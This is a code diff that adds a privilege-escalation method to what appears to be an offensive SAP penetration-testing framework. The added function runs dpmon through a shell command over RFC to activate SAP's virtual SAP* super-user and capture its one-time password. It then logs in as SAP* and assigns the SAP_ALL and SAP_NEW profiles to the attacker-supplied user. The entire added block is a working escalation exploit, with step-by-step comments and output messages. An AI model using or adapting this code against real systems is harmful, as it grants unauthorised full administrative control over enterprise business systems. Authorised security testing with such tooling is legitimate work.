@@ -497,3 +497,160 @@ def lpe_bapi_profiles_assign(node: SAPNode, creds: Credentials) -> bool:
         err = str(e).split("\n")[0]
         print(f"[-] {node.sid}: RFC call failed: {err}")
         return False
+
+
+# ===================================================================
+# LPE METHOD: dpmon virtual SAP* (kernel >= 790, ABAP-only)
+# ===================================================================
+
+@lpe_method(
+    "dpmon_sap_star",
+    "Activate virtual SAP* via dpmon (kernel >= 790, ABAP), "
+    "use OTP to BAPI-assign SAP_ALL to the current user",
+    priority=20,
+)
+def lpe_dpmon_sap_star(node: SAPNode, creds: Credentials) -> bool:
+    """Escalate to SAP_ALL by activating the kernel's virtual SAP*
+    super-user via dpmon (SAP Note 3303172), then using the OTP to
+    BAPI-assign SAP_ALL to the originally-supplied credentials.
+
+    Preconditions:
+      * Node kernel >= 790
+      * Node has an ABAP stack (system_type contains "ABAP")
+      * The supplied creds permit calling SXPG_STEP_XPG_START via an
+        existing TCP/IP destination (S_LOG_COM or equivalent).
+        If no sapxpg dest exists and the user lacks S_RFC_ADM to
+        create one, this method bails -- the framework falls through
+        to the next LPE method.
+
+    Flow:
+      1. Pre-flight gate via is_dpmon_sap_star_available().
+      2. Wrap SXPG_STEP_XPG_START in an exec_fn compatible with the
+         sap_dpmon_sapstar primitive.
+      3. Activate -> capture OTP from dpmon's "Access unlocked..."
+         output.
+      4. Open a NEW RFC connection as SAP*/<OTP>/<client>.
+         CRITICAL: this must be a single clean call -- any password
+         retry burns the OTP.
+      5. Call BAPI_USER_PROFILES_ASSIGN to grant SAP_ALL + SAP_NEW
+         to the original user.
+      6. Commit; tag node.dpmon_sap_star_used = True.
+
+    Audit note: every activation records a Security Audit Log event
+    EUP, purpose 2 (documented).  This is not a stealthy escalation.
+    """
+    try:
+        from sap_dpmon_sapstar import (
+            is_dpmon_sap_star_available,
+            activate_virtual_sap_star,
+        )
+    except ImportError as e:
+        logger.debug("sap_dpmon_sapstar not importable: %s", e)
+        return False
+
+    if not is_dpmon_sap_star_available(node.kernel, node.system_type):
+        print(f"[-] {node.sid}: dpmon SAP* unavailable "
+              f"(kernel={node.kernel or '?'}, "
+              f"system_type={node.system_type or '?'})")
+        return False
+
+    import sapmap_rfc
+
+    # exec_fn: wrap the dpmon shell pipeline in SXPG_STEP_XPG_START.
+    # The pipeline already pipes its menu input via `echo <b64> |
+    # base64 -d | LANG=C dpmon`.  We give it to /bin/sh -c so the
+    # shell handles the pipe; that's the same pattern SAPMAP uses
+    # for SecStore + JSP deployment.
+    def exec_fn(cmd: str) -> str:
+        # POSIX-portable single-quote escaping: replace ' with '\''.
+        # _build_dpmon_command was tweaked to avoid single quotes
+        # internally, so the only quote to worry about here is the
+        # outer wrapping pair.
+        escaped = cmd.replace("'", "'\\''")
+        try:
+            r = sapmap_rfc.execute_local_command(
+                node,
+                command="/bin/sh",
+                params=f"-c '{escaped}'",
+                creds=creds,
+            )
+        except Exception as exc:
+            # The framework expects exec_fn to return str on any
+            # outcome -- raising would surface as "exec_fn raised: ..."
+            # in the parser's error, which is what we want.
+            raise RuntimeError(
+                f"SXPG_STEP_XPG_START failed: {exc}") from exc
+        if not r.get("success"):
+            err = r.get("error") or "(no error)"
+            raise RuntimeError(f"SXPG returned no output: {err}")
+        return "\n".join(r.get("output", []))
+
+    # Pick the client to target.  Best signal is the creds' own
+    # client (we know it exists -- we're logged into it).  Fall back
+    # to 001 / 100 / 000 in that order.
+    client = (creds.client or "").zfill(3) if creds.client else "001"
+
+    print(f"[*] {node.sid}: dpmon SAP* — activating in client {client} "
+          f"(kernel {node.kernel}, validity 10 min)")
+    try:
+        result = activate_virtual_sap_star(
+            exec_fn,
+            sid=node.sid,
+            instance_nr=(creds.instance_nr or "00"),
+            client=client,
+            duration_min=10,
+        )
+    except Exception as e:
+        print(f"[-] {node.sid}: dpmon activation raised: {e}")
+        return False
+
+    if not result["success"]:
+        print(f"[-] {node.sid}: dpmon activation failed: {result['error']}")
+        return False
+
+    otp = result["otp"]
+    applied_client = result["client"]
+    print(f"[+] {node.sid}: OTP obtained "
+          f"(client={applied_client}, "
+          f"valid {result['validity_min']} min)")
+
+    # Single-shot RFC logon as SAP*/<OTP> -> BAPI assign SAP_ALL to
+    # the original user.  Any retry on bad credentials burns the OTP
+    # immediately, so we don't probe -- one call, success or not.
+    sap_star_creds = Credentials(
+        username="SAP*",
+        password=otp,
+        client=applied_client,
+        instance_nr=creds.instance_nr or "00",
+        verified=False,
+    )
+
+    try:
+        with sapmap_rfc._get_connection(node, sap_star_creds) as conn:
+            ret = conn.call(
+                "BAPI_USER_PROFILES_ASSIGN",
+                USERNAME=creds.username.upper(),
+                PROFILES=[
+                    {"BAPIPROF": "SAP_ALL"},
+                    {"BAPIPROF": "SAP_NEW"},
+                ],
+            )
+            ret_list = ret.get("RETURN", {})
+            if isinstance(ret_list, dict):
+                ret_list = [ret_list]
+            for r in ret_list:
+                if r.get("TYPE", "") in ("E", "A"):
+                    print(f"[-] {node.sid}: BAPI error: "
+                          f"{r.get('MESSAGE', '?')}")
+                    return False
+            conn.call("BAPI_TRANSACTION_COMMIT", WAIT="X")
+        node.dpmon_sap_star_used = True
+        print(f"[+] {node.sid}: SAP_ALL + SAP_NEW assigned to "
+              f"{creds.username} via SAP* OTP "
+              f"(dpmon virtual super-user)")
+        return True
+    except Exception as e:
+        print(f"[-] {node.sid}: RFC logon as SAP* failed "
+              f"(OTP is now burned regardless): "
+              f"{str(e).splitlines()[0]}")
+        return False
